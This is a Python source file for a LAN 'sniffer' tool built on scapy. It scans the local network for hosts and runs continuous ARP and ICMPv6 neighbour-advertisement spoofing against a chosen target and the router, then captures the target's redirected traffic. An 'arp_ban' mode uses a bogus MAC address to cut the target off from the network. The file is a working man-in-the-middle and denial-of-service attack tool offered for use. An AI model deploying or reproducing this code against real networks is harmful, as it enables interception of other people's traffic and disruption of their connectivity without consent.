import ipaddress
import threading
import time
from collections import defaultdict

import netifaces
from scapy.config import conf
from scapy.layers import l2, inet, inet6
from scapy.packet import Packet
from scapy.sendrecv import sendp, sniff, srp, send, AsyncSniffer

from monitor import attack


class Sniffer:
    def __init__(self, iface: str = conf.iface):
        """
        LAN Network Sniffer
        :param iface: network interface
        """
        self.started = False

        try:
            self.iface = iface.name
        except:
            self.iface = iface

        gws = netifaces.gateways()
        try:  # Windows platform
            from scapy.arch import ifaces
            guid = ifaces.dev_from_name(iface).guid
            addr = netifaces.ifaddresses(guid)
            gw = {v: u for u, v, w in gws[netifaces.AF_INET]}.get(guid)
            gw6 = {v: u for u, v, w in gws[netifaces.AF_INET6]}.get(guid)
        except:  # Linux platform
            addr = netifaces.ifaddresses(iface)
            gw = {v: u for u, v, w in gws[netifaces.AF_INET]}.get(iface)
            gw6 = {v: u for u, v, w in gws[netifaces.AF_INET6]}.get(iface)

        self.ip = {i['addr'] for i in addr[netifaces.AF_INET]}
        self.ip6 = {i['addr'].split('%')[0] for i in addr[netifaces.AF_INET6]}
        self.mac = addr[netifaces.AF_LINK][0]['addr']

        self.router_ip = {gw} if gw is not None else set()
        self.router_ip6 = {gw6} if gw6 is not None else set()
        self.router_mac = l2.getmacbyip(list(self.router_ip)[0]) if gw is not None else ''

        self.target_ip = set()
        self.target_ip6 = set()
        self.target_mac = ''

        self.rarp_table = defaultdict(set)
        self.rarp_table6 = defaultdict(set)

        net = ['%s/%s' % (i['addr'], i['netmask']) for i in addr[netifaces.AF_INET]]
        net6 = ['%s/%s' % (i['addr'].split('%')[0], i['netmask'].split('/')[1]) for i in addr[netifaces.AF_INET6]]
        self.net = {str(ipaddress.IPv4Network(i, False)) for i in net}
        self.net6 = {str(ipaddress.IPv6Network(i, False)) for i in net6}

        print("Addresses of %s interface:" % iface)
        print("Interface IP list   : %s" % ', '.join(self.ip))
        print("Interface net list  : %s" % ', '.join(self.net))
        print("Interface IP6 list  : %s" % ', '.join(self.ip6))
        print("Interface net6 list : %s" % ', '.join(self.net6))
        print("Interface MAC       : %s" % self.mac)
        print("(One of) Router IP  : %s" % ', '.join(self.router_ip))
        print("(One of) Router IP6 : %s" % ', '.join(self.router_ip6))
        print("Router MAC          : %s" % self.router_mac)

        self.sniffer = None
        self._respoof_mac = 'aa:bb:cc:dd:ee:ff'
        self._ipv6_added = False

    def scan(self, timeout=3) -> dict:
        """
        IPv4 LAN scanning, discover sniffable hosts
        :param timeout: timeout for ARP and ICMP response
        """
        # ARP request broadcast
        for net in self.net:
            req_list = l2.Ether(dst='ff:ff:ff:ff:ff:ff') / l2.ARP(pdst=net)
            res_list = srp(req_list, timeout=timeout, verbose=False, iface=self.iface)[0]
            for req, res in res_list:
                if res[l2.ARP].psrc not in self.ip and res[l2.ARP].hwsrc != self.mac:
                    self.rarp_table[res[l2.ARP].hwsrc].add(res[l2.ARP].psrc)
        # ICMP broadcast
        for net in self.net:
            multicast_dst = str(ipaddress.IPv4Network(
                int(ipaddress.IPv4Network(net).hostmask) + int(ipaddress.IPv4Address(net.split('/')[0]))))
            req = inet.IP(dst=multicast_dst) / inet.ICMP()
            send(req, verbose=False, iface=self.iface)
            res_list = sniff(timeout=timeout, iface=self.iface)
            for res in res_list:
                if res.haslayer(inet.ICMP) and res[inet.ICMP].type == 0 and res[inet.IP].src not in self.ip and res[
                    l2.Ether].src != self.mac:
                    self.rarp_table[res[l2.Ether].src].add(res[inet.IP].src)
        # update router packets
        self.router_ip |= self.rarp_table.get(self.router_mac, set())
        return self.rarp_table

    def scan6(self, timeout=3):
        """
        IPv6 LAN scanning, discover sniffable hosts
        :param timeout: timeout for ICMPv6 response
        """
        req = inet6.IPv6(dst='ff02::1') / inet6.ICMPv6EchoRequest()
        send(req, verbose=False, iface=self.iface)
        res_list = sniff(timeout=timeout, iface=self.iface)
        for res in res_list:
            if (res.haslayer(inet6.ICMPv6EchoReply) or res.haslayer(inet6.ICMPv6NDOptDstLLAddr)) \
                    and res[inet6.IPv6].src not in self.ip6 and res[l2.Ether].src != self.mac:
                for net6 in self.net6:  # it's so tedious to convert ip address and network format from one to another
                    self.rarp_table6[res[l2.Ether].src].add(str(ipaddress.IPv6Address((int(
                        ipaddress.IPv6Address(res[inet6.IPv6].src)) & 0xFFFFFFFFFFFFFFFF) + int(
                        ipaddress.IPv6Address(net6.split('/')[0])))))
        # update router packets
        self.router_ip6 |= self.rarp_table6.get(self.router_mac, set())
        return self.rarp_table6

    def add(self, ip: str):
        """
        Add an IPv4 address to target
        :param ip: IPv4 address
        """
        mac = l2.getmacbyip(ip)
        if mac is not None:
            self.rarp_table[mac].add(ip)

    def add6(self, ip6: str):
        """
        Add an IPv6 address to target
        :param ip6: IPv6 address
        """
        mac = inet6.getmacbyip6(ip6)
        if mac is not None:
            self.rarp_table6[mac].add(ip6)

    def set(self, target_mac: str):
        """
        Set a target from scan results
        :param target_mac: target's mac
        """
        self.target_mac = target_mac
        self.target_ip = self.rarp_table.get(target_mac, set())
        self.target_ip6 = self.rarp_table6.get(target_mac, set())

    def start(self, on_recv: callable, spoof_interval=5):
        """
        Start sniffing
        :param on_recv: a callback function when receiving a packet
        :param spoof_interval: time interval between sending two spoofing packets
        """
        self.sniffer = AsyncSniffer(lfilter=self._filter, iface=self.iface, prn=on_recv)
        self.spoof_interval = spoof_interval
        self.started = True
        if spoof_interval != 0:
            threading.Thread(target=self._spoof_router, daemon=False).start()
            threading.Thread(target=self._spoof_target, daemon=False).start()
        self.sniffer.start()
        print("Sniffing started")

    def stop(self):
        """
        Stop sniffing
        """
        self.started = False
        if self.sniffer is not None:
            self.sniffer.stop()
            self.sniffer = None
        print("Sniffing stopped")

    def _spoof_router(self):
        """
        ARP and ICMPv6 spoof router
        """
        while self.started:
            mac = self._respoof_mac if attack.arp_ban else self.mac
            # ARP spoofing
            for target_ip in self.target_ip:
                for router_ip in self.router_ip:
                    p = l2.Ether(dst=self.router_mac) / \
                        l2.ARP(op=2, psrc=target_ip, pdst=router_ip, hwsrc=mac)
                    sendp(p, verbose=False, iface=self.iface)
            # ICMPv6 neighbour spoofing
            for target_ip6 in self.target_ip6:
                for router_ip6 in self.router_ip6:
                    p = l2.Ether(src=mac, dst=self.router_mac) / \
                        inet6.IPv6(src=target_ip6, dst=router_ip6) / \
                        inet6.ICMPv6ND_NA(tgt=target_ip6, R=0) / \
                        inet6.ICMPv6NDOptDstLLAddr(lladdr=mac)
                    sendp(p, verbose=False, iface=self.iface)
            time.sleep(self.spoof_interval)

    def _spoof_target(self):
        """
        ARP and ICMPv6 spoof targets
        """
        while self.started:
            # ARP spoofing
            for target_ip in self.target_ip:
                for router_ip in self.router_ip:
                    p = l2.Ether(dst=self.target_mac) / \
                        l2.ARP(op=2, psrc=router_ip, pdst=target_ip, hwsrc=self.mac)
                    sendp(p, verbose=False, iface=self.iface)
            # ICMPv6 neighbour spoofing
            for target_ip6 in self.target_ip6:
                for router_ip6 in self.router_ip6:
                    p = l2.Ether(dst=self.target_mac) / \
                        inet6.IPv6(src=router_ip6, dst=target_ip6) / \
                        inet6.ICMPv6ND_NA(tgt=router_ip6, R=0) / \
                        inet6.ICMPv6NDOptDstLLAddr(lladdr=self.mac)
                    sendp(p, verbose=False, iface=self.iface)
            time.sleep(self.spoof_interval)

    def _filter(self, p: Packet):
        """
        Filter packets to make sure we only process our target's packet
        :param p: packet to be determined
        """
        if p[l2.Ether].type == 2048:
            src = p[inet.IP].src
            dst = p[inet.IP].dst
            return not ipaddress.IPv4Address(dst).is_multicast \
                   and src not in self.ip and dst not in self.ip
        elif p[l2.Ether].type == 34525:
            src = p[inet6.IPv6].src
            dst = p[inet6.IPv6].dst
            if not p.haslayer(inet6.ICMPv6ND_NA) \
                    and not ipaddress.IPv6Address(dst).is_multicast \
                    and src not in self.ip6 and dst not in self.ip6:
                if not self._ipv6_added:
                    self.target_ip6.add(src)
                    self._ipv6_added = True
                return True
        return False
